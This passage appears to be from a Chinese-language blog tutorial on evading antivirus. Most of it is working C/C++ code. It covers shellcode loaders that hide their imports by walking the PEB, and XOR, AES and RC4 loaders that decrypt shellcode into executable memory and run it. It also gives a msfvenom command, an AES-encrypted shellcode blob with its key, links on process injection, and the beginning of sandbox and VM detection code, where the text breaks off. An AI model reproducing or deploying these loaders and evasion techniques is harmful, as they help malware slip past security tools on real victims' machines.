<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 声明获取 InInitializationOrderModuleList 链表的函数</span><br><span class="line">extern &quot;C&quot; PVOID __stdcall GetInInitializationOrderModuleList();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; UNICODE_STRING 结构体定义</span><br><span class="line">typedef struct _UNICODE_STRING &#123;</span><br><span class="line">    USHORT Length;  &#x2F;&#x2F;表示字符串中的字符数,由于它是unicode形式的字符,因此每个字符占两个字节</span><br><span class="line">    USHORT MaximumLength;  &#x2F;&#x2F;分配的内存空间的大小，以字节为单位</span><br><span class="line">    PWSTR Buffer;  &#x2F;&#x2F;表示指向存储Unicode字符串的字符数组的指针</span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取 Kernel32.dll 的基地址</span><br><span class="line">HMODULE GetKernel32Address() &#123;</span><br><span class="line">    &#x2F;&#x2F; 获取 InInitializationOrderModuleList 链表</span><br><span class="line">    LIST_ENTRY* pNode &#x3D; (LIST_ENTRY*)GetInInitializationOrderModuleList();</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取 FullDllName 成员</span><br><span class="line">        UNICODE_STRING* FullDllName &#x3D; (UNICODE_STRING*)((BYTE*)pNode + 0x38);</span><br><span class="line">        &#x2F;&#x2F; 如果 Buffer 中的第 13 个字符为空字符，则已找到 Kernel32.dll</span><br><span class="line">        if (*(FullDllName-&gt;Buffer + 12) &#x3D;&#x3D; &#39;\0&#39;) &#123;</span><br><span class="line">            &#x2F;&#x2F; 返回模块的基地址</span><br><span class="line">            return (HMODULE)(*((ULONG64*)((BYTE*)pNode + 0x10)));</span><br><span class="line">        &#125;</span><br><span class="line">        pNode &#x3D; pNode-&gt;Flink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取 GetProcAddress 函数的地址</span><br><span class="line">DWORD64 RGetProcAddress(HMODULE hKernal32) &#123;</span><br><span class="line">    &#x2F;&#x2F; 获取 DOS 头</span><br><span class="line">    PIMAGE_DOS_HEADER baseAddr &#x3D; (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line">    &#x2F;&#x2F; 获取 NT 头</span><br><span class="line">    PIMAGE_NT_HEADERS pImageNt &#x3D; (PIMAGE_NT_HEADERS)((LONG64)baseAddr + baseAddr-&gt;e_lfanew);</span><br><span class="line">    &#x2F;&#x2F; 获取导出表</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir &#x3D; (PIMAGE_EXPORT_DIRECTORY)((LONG64)baseAddr + pImageNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    &#x2F;&#x2F; 获取导出函数地址数组、导出函数名数组和导出函数序号数组</span><br><span class="line">    PULONG RVAFunctions &#x3D; (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfFunctions);</span><br><span class="line">    PULONG RVANames &#x3D; (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames);</span><br><span class="line">    PUSHORT AddressOfNameOrdinals &#x3D; (PUSHORT)((LONG64)baseAddr + exportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 遍历导出函数</span><br><span class="line">    for (size_t i &#x3D; 0; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取当前函数地址</span><br><span class="line">        LONG64 F_va_Tmp &#x3D; (ULONG64)((LONG64)baseAddr + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]);</span><br><span class="line">        &#x2F;&#x2F; 获取当前函数名地址</span><br><span class="line">        PUCHAR FunctionName &#x3D; (PUCHAR)((LONG64)baseAddr + RVANames[i]);</span><br><span class="line">        &#x2F;&#x2F; 如果当前函数名是 &quot;GetProcAddress&quot;，返回其地址</span><br><span class="line">        if (!strcmp((const char*)FunctionName, &quot;GetProcAddress&quot;)) &#123;</span><br><span class="line">            return F_va_Tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义函数指针类型</span><br><span class="line">typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);</span><br><span class="line">typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);</span><br><span class="line">typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);</span><br><span class="line">typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 获取 Kernel32.dll 的基地址和GetProcAddress函数地址</span><br><span class="line">    HMODULE hKernal32 &#x3D; GetKernel32Address();</span><br><span class="line">    pGetProcAddress MyGetProcAddress &#x3D; (pGetProcAddress)RGetProcAddress(hKernal32);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;开始获取各种函数</span><br><span class="line">    pVirtualProtect MyVirtualProtect &#x3D; (pVirtualProtect)MyGetProcAddress(hKernal32, &quot;VirtualProtect&quot;);</span><br><span class="line">    pCreateThread MyCreateThread &#x3D; (pCreateThread)MyGetProcAddress(hKernal32, &quot;CreateThread&quot;);</span><br><span class="line">    pWaitForSingleObject MyWaitForSingleObject &#x3D; (pWaitForSingleObject)MyGetProcAddress(hKernal32, &quot;WaitForSingleObject&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 组合加载shellcode</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    MyVirtualProtect((LPVOID)buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    HANDLE hThread &#x3D; MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(LPVOID)buf, NULL, 0, NULL);</span><br><span class="line">    MyWaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://www.pentester.top/index.php/archives/65/">免杀技巧之API动态加载技术</a></p>
<p><a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav">通过重写ring3 API函数实现免杀</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/video/34367">动态调用系统API避免导入表检测</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12035?time__1311=mqmhBKD50KGK4WqGNDQbiQvdS4NwPGOb8eD&alichlgref=https://cn.bing.com/">通过隐藏导入表的方式规避杀软</a></p>
<p>工具：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/JustasMasiulis/lazy_importer">lazy_importer: library for importing functions from dlls in a hidden, reverse engineer unfriendly way</a></p>
<h2 id="进程注入-x"><a href="#进程注入-x" class="headerlink" title="进程注入(x)"></a>进程注入(x)</h2><p>大块内容，暂时挖坑</p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-271554.htm">高级进程注入总结</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonelee/p/15957493.html">进程注入、代码注入、傀儡注入检测</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/6336950.html">Windows Process Injection(Windows进程注入)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.elastic.co/cn/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">Ten process injection techniques: A technical survey of common and trending process injection techniques | Elastic Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/">SECFORCE - Security without compromise</a></p>
<p><a target="_blank" rel="noopener" href="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide">TrustedSec | Burrowing a Hollow in a DLL to Hide</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/">Hiding malicious code with “Module Stomping”: Part 1 - F-Secure Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.omroot.io/process-code-injection-through-undocumented-ntapis/">Process Code Injection Through Undocumented NTAPI (omroot.io)</a></p>
<h1 id="shellcode的混淆加密"><a href="#shellcode的混淆加密" class="headerlink" title="shellcode的混淆加密"></a>shellcode的混淆加密</h1><p>针对shellcode不同的加密方式</p>
<h2 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h2><p>shellcode生成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; --encrypt xor -f c -o shellcode.c --encrypt-key test</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char encshellcode[] &#x3D; &quot;xor shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int buflen &#x3D; sizeof encshellcode;</span><br><span class="line">    char key[] &#x3D; &quot;test&quot;;</span><br><span class="line">    unsigned char shellcode[sizeof encshellcode];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; XOR 解密</span><br><span class="line">    int j &#x3D; 0;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; sizeof encshellcode; i++) &#123;</span><br><span class="line">        if (j &#x3D;&#x3D; sizeof key - 1) j &#x3D; 0;</span><br><span class="line">        shellcode[i] &#x3D; encshellcode[i] ^ key[j];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    for (int i &#x3D; 0; i &lt; sizeof shellcode; i++) &#123;</span><br><span class="line">        printf(&quot;\\x%02x&quot;, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line">    ((void(*)())exec)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tips：使用 InterlockedXor 进行平替异或符号，<a target="_blank" rel="noopener" href="https://saucer-man.com/operation_and_maintenance/465.html#cl-1">加载混淆的shellcode实现静态免杀</a></p>
<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>导入aes模块：<a target="_blank" rel="noopener" href="https://github.com/xf555er/ShellcodeEncryption/tree/master/aes%E5%8A%A0%E5%AF%86">ShellcodeEncryption/aes加密 </a></p>
<p>项目结构如下</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410231219455.png" alt="image-20240410231219455"></p>
<p>tools.h</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;AES.h&quot;</span><br><span class="line">#include &quot;Base64.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;random&gt;</span><br><span class="line">#include &lt;sstream&gt;</span><br><span class="line">#include &lt;iomanip&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">string EncryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv);</span><br><span class="line"></span><br><span class="line">string DecryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv);</span><br><span class="line"></span><br><span class="line">string random_string(size_t length);</span><br><span class="line"></span><br><span class="line">string toHexString(unsigned char* data, size_t len);</span><br></pre></td></tr></table></figure>

<p>tools.cpp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;tools.h&quot;</span><br><span class="line">#define BUF_SIZE 4096</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">string EncryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv) &#123;</span><br><span class="line">	size_t length &#x3D; strSrc.length();</span><br><span class="line">	int block_num &#x3D; length &#x2F; BLOCK_SIZE + 1;</span><br><span class="line">	&#x2F;&#x2F;明文</span><br><span class="line">	char* szDataIn &#x3D; new char[block_num * BLOCK_SIZE + 1];</span><br><span class="line">	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);</span><br><span class="line">	strcpy(szDataIn, strSrc.c_str());</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;进行PKCS7Padding填充。</span><br><span class="line">	int k &#x3D; length % BLOCK_SIZE;</span><br><span class="line">	int j &#x3D; length &#x2F; BLOCK_SIZE;</span><br><span class="line">	int padding &#x3D; BLOCK_SIZE - k;</span><br><span class="line">	for (int i &#x3D; 0; i &lt; padding; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		szDataIn[j * BLOCK_SIZE + k + i] &#x3D; padding;</span><br><span class="line">	&#125;</span><br><span class="line">	szDataIn[block_num * BLOCK_SIZE] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;加密后的密文</span><br><span class="line">	char* szDataOut &#x3D; new char[block_num * BLOCK_SIZE + 1];</span><br><span class="line">	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;进行进行AES的CBC模式加密</span><br><span class="line">	AES aes;</span><br><span class="line">	aes.MakeKey(g_key, g_iv, 16, 16);</span><br><span class="line">	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);</span><br><span class="line">	string str &#x3D; base64_encode((unsigned char*)szDataOut,</span><br><span class="line">		block_num * BLOCK_SIZE);</span><br><span class="line">	delete[] szDataIn;</span><br><span class="line">	delete[] szDataOut;</span><br><span class="line">	return str;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">string DecryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv) &#123;</span><br><span class="line">	string strData &#x3D; base64_decode(strSrc);</span><br><span class="line">	size_t length &#x3D; strData.length();</span><br><span class="line">	&#x2F;&#x2F;密文</span><br><span class="line">	char* szDataIn &#x3D; new char[length + 1];</span><br><span class="line">	memcpy(szDataIn, strData.c_str(), length + 1);</span><br><span class="line">	&#x2F;&#x2F;明文</span><br><span class="line">	char* szDataOut &#x3D; new char[length + 1];</span><br><span class="line">	memcpy(szDataOut, strData.c_str(), length + 1);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;进行AES的CBC模式解密</span><br><span class="line">	AES aes;</span><br><span class="line">	aes.MakeKey(g_key, g_iv, 16, 16);</span><br><span class="line">	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;去PKCS7Padding填充</span><br><span class="line">	if (0x00 &lt; szDataOut[length - 1] &lt;&#x3D; 0x16)</span><br><span class="line">	&#123;</span><br><span class="line">		int tmp &#x3D; szDataOut[length - 1];</span><br><span class="line">		for (int i &#x3D; length - 1; i &gt;&#x3D; length - tmp; i--)</span><br><span class="line">		&#123;</span><br><span class="line">			if (szDataOut[i] !&#x3D; tmp)</span><br><span class="line">			&#123;</span><br><span class="line">				memset(szDataOut, 0, length);</span><br><span class="line">				cout &lt;&lt; &quot;去填充失败！解密出错！！&quot; &lt;&lt; endl;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">				szDataOut[i] &#x3D; 0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	string strDest(szDataOut);</span><br><span class="line">	delete[] szDataIn;</span><br><span class="line">	delete[] szDataOut;</span><br><span class="line">	return strDest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string random_string(size_t length)</span><br><span class="line">&#123;</span><br><span class="line">	auto randchar &#x3D; []() -&gt; char</span><br><span class="line">		&#123;</span><br><span class="line">			const char charset[] &#x3D;</span><br><span class="line">				&quot;0123456789&quot;</span><br><span class="line">				&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">				&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">				&quot;!@#$%^&amp;*()_+&#x3D;-[]&#123;&#125;;:,.&lt;&gt;&#x2F;?|&quot;;</span><br><span class="line">			const size_t max_index &#x3D; (sizeof(charset) - 1);</span><br><span class="line">			return charset[rand() % max_index];</span><br><span class="line">		&#125;;</span><br><span class="line">	string str(length, 0);</span><br><span class="line">	generate_n(str.begin(), length, randchar);</span><br><span class="line">	return str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string toHexString(unsigned char* data, size_t len)</span><br><span class="line">&#123;</span><br><span class="line">	ostringstream oss;</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; len; ++i)</span><br><span class="line">		oss &lt;&lt; hex &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; static_cast&lt;int&gt;(data[i]);</span><br><span class="line">	return oss.str();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shellcode_enc.cpp 用于生成key与iv，并将shellcode加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;tools.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;生成随机16位的key值和iv值</span><br><span class="line">	srand(time(0)); &#x2F;&#x2F; initialize random seed</span><br><span class="line">	string g_key &#x3D; random_string(16);</span><br><span class="line">	string g_iv &#x3D; random_string(16);</span><br><span class="line">	cout &lt;&lt; &quot;[+]key值: &quot; &lt;&lt; g_key &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;[+]iv值: &quot; &lt;&lt; g_iv &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;将shellcode字节数组转换成十六进制字符串</span><br><span class="line">	size_t bufLen &#x3D; sizeof(buf) &#x2F; sizeof(unsigned char) - 1;</span><br><span class="line">	string OriginalShellcode &#x3D; toHexString(buf, bufLen);</span><br><span class="line">	cout &lt;&lt; &quot;[+]未加密的shellcode: &quot; &lt;&lt; OriginalShellcode &lt;&lt; endl;</span><br><span class="line">	&#x2F;&#x2F;对shellcode字符串进行加密</span><br><span class="line">	string EncryptShellcode &#x3D; EncryptionAES(OriginalShellcode, g_key.c_str(), g_iv.c_str());</span><br><span class="line">	cout &lt;&lt; &quot;[+]加密后的shellcode: &quot; &lt;&lt; EncryptShellcode &lt;&lt; endl;</span><br><span class="line">	&#x2F;&#x2F;对加密后的shellcode字符串进行解密</span><br><span class="line">	string DecryptShellcode &#x3D; DecryptionAES(EncryptShellcode, g_key.c_str(), g_iv.c_str());</span><br><span class="line">	cout &lt;&lt; &quot;[+]解密后的shellcode: &quot; &lt;&lt; DecryptShellcode &lt;&lt; endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240410231122463.png" alt="image-20240410231122463"></p>
<p>然后在main.cpp中进行解密与加载shellcode</p>
<p>main.cpp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;AES.h&quot;</span><br><span class="line">#include &quot;Base64.h&quot;</span><br><span class="line">#include &quot;tools.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char g_key[17] &#x3D; &quot;o+aMJ3dY7Wy&amp;v&lt;Me&quot;;   &#x2F;&#x2F;填写key密钥</span><br><span class="line">    char g_iv[17] &#x3D; &quot;cz-ax@RDj].62&#123;c;&quot;;  &#x2F;&#x2F;定义iv向量</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 加密后的shellcode</span><br><span class="line">	string buf &#x3D; &quot;HBqjD&#x2F;JxIjs7hoFY+ujH2xb&#x2F;7c9oOoHrxhRH84xVGjBV+Na0IdYACn4kPVd2Rnmb3Jk9Uxpsr8diLtRodIVWJOS1&#x2F;qG0DG+YvNvc1sqhxNjRadalgWbDcIYhKVO8EGBM+5Sfluez&#x2F;acKdyQjeRScESS9RyUxRgcd5Z1OOHDqmrTLKgXLsYxyFMRRD+Mq25LFMEzOxfUglIqi8OR74p4FMVf3Oinx2SxOfkglfQkcXvkUUdMfMb5nIhPv7IuPxJApPbF7zs8g&#x2F;kbN6NgcI0CpCIxWu8epxAeRC2gqhgzCkV50iZDPzFXK5q+PP9STOdgzDI&#x2F;xBnw2TmQGwnJIFgFbWZ69IpFImH5Lq3qniDzpQlV2wS0Q29tOR37rg+xLdyO5P2VVdEGOummQVjTQBKRJ9tfme69kHuvPSvXMMtvH1UHfTy9fdDpnPqCYWAbp0wz1W34yZZpX0gJA1HRzTxR0Jo176UOY4EoqxLL5rLie1e1b198b0gWMi3FUosTHMP+1aGx2WJZONE8EVSFfGP8lEa3anQSx&#x2F;J1ZrZheltCXJ6VKUMTUIA&#x2F;yMT+2hIBcMUgG&#x2F;W9wYgv9xWYFLryxqHVSD45bDlTewwQjI6uI1xLau8VP2abmJQLbJt4BxlEr1pCdzZl+slhpDkT8lOD&#x2F;u82&#x2F;rMymdedmgMVJMnOG8B9cdK4ilzY9dR1jQGZS4PVwg0gvZbPz7pVlLpHfj5qnD4c3k5BdcvFS+Z+XbCLE5+R7AuU&#x3D;&quot;;</span><br><span class="line">	&#x2F;&#x2F; 解密shellcode</span><br><span class="line">	string strbuf &#x3D; DecryptionAES(buf, g_key, g_iv);</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F;将解密的shellcode放到shellcode数组中</span><br><span class="line">	char* p &#x3D; (char*)strbuf.c_str();</span><br><span class="line">	unsigned char* shellcode &#x3D; (unsigned char*)calloc(strbuf.length() &#x2F; 2, sizeof(unsigned char));</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 两字节的输入到shellcode地址中，所以长度为一半</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; strbuf.length() &#x2F; 2; i++) &#123;</span><br><span class="line">		sscanf(p, &quot;%02x&quot;, &amp;shellcode[i]);</span><br><span class="line">		p +&#x3D; 2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;输出shellcode数组里的内容</span><br><span class="line">	int ShellcodeSize &#x3D; strbuf.length() &#x2F; 2;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+]Decrypted buffer:\n&quot;);</span><br><span class="line">	for (int i &#x3D; 0; i &lt; ShellcodeSize; i++) &#123;</span><br><span class="line">		printf(&quot;\\x%02x&quot;, shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char *Memory;</span><br><span class="line">	Memory &#x3D; (char *)VirtualAlloc(NULL, sizeof(ShellcodeSize), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	&#x2F;&#x2F;memcpy(Memory, shellcode, sizeof(ShellcodeSize));</span><br><span class="line">	RtlMoveMemory(Memory, shellcode, ShellcodeSize);</span><br><span class="line">	((void(*)())Memory)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">#define size_b 256</span><br><span class="line">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;初始化s表</span><br><span class="line">void init_sbox(unsigned char* key) &#123;</span><br><span class="line">    unsigned int i, j, k;</span><br><span class="line">    int tmp;</span><br><span class="line">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class="line">        sbox[i] &#x3D; i;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; k &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class="line">        tmp &#x3D; sbox[i];</span><br><span class="line">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class="line">        sbox[i] &#x3D; sbox[j];</span><br><span class="line">        sbox[j] &#x3D; tmp;</span><br><span class="line">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;加解密函数</span><br><span class="line">void enc_dec(unsigned char* key, unsigned char* data) &#123;</span><br><span class="line">    int i, j, k, R, tmp;</span><br><span class="line">    init_sbox(key);</span><br><span class="line"></span><br><span class="line">    j &#x3D; k &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class="line">        j &#x3D; (j + 1) % size_b;</span><br><span class="line">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class="line"></span><br><span class="line">        tmp &#x3D; sbox[j];</span><br><span class="line">        sbox[j] &#x3D; sbox[k];</span><br><span class="line">        sbox[k] &#x3D; tmp;</span><br><span class="line"></span><br><span class="line">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class="line"></span><br><span class="line">        data[i] ^&#x3D; R;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line">	unsigned char key[] &#x3D; &quot;hacker_hack&quot;;</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 加密</span><br><span class="line">	enc_dec(key,buf);</span><br><span class="line">	printf(&quot;[+]加密: &quot;);</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; sizeof(buf); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;\\x%02x&quot;, buf[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 解密</span><br><span class="line">	enc_dec(key, buf);</span><br><span class="line">	printf(&quot;\n[+]解密: &quot;);</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; sizeof(buf); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;\\x%02x&quot;, buf[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	LPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	RtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class="line">	HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	VirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="反调试-沙箱-虚拟机"><a href="#反调试-沙箱-虚拟机" class="headerlink" title="反调试/沙箱/虚拟机"></a>反调试/沙箱/虚拟机</h1><p><a target="_blank" rel="noopener" href="https://github.com/ZanderChang/anti-sandbox/tree/master">Windows对抗沙箱和虚拟机的方法总结</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w">https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/628376104">虚拟机检测技术整理</a></p>
<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>开机时间，temp文件数量，cpu数量，物理内存大小，硬盘大小，进程，注册表，usb连接记录，样本名称，微信/Google程序，命名管道通信，延时执行，加速检测</p>
<p>开机时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetUpTime()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD iRunTime &#x3D; GetTickCount();</span><br><span class="line">    DWORD TestTime &#x3D; 1800000; &#x2F;&#x2F; 半个小时开机时间</span><br><span class="line">    if (iRunTime &gt; TestTime) printf(&quot;[+]not vm\n&quot;);</span><br><span class="line"></span><br><span class="line">    const int Num1 &#x3D; 1000;</span><br><span class="line">    const int Num2 &#x3D; 1900;</span><br><span class="line">    time_t nowTime;</span><br><span class="line">    time(&amp;nowTime);</span><br><span class="line">    time_t systemUpTime &#x3D; nowTime - (iRunTime &#x2F; Num1);</span><br><span class="line">    struct tm* timeInfo;</span><br><span class="line">    timeInfo &#x3D; localtime(&amp;systemUpTime);</span><br><span class="line">    printf(&quot;开机的时间: %d-%d-%d %02d:%02d:%02d&quot;, timeInfo-&gt;tm_year + Num2,</span><br><span class="line">        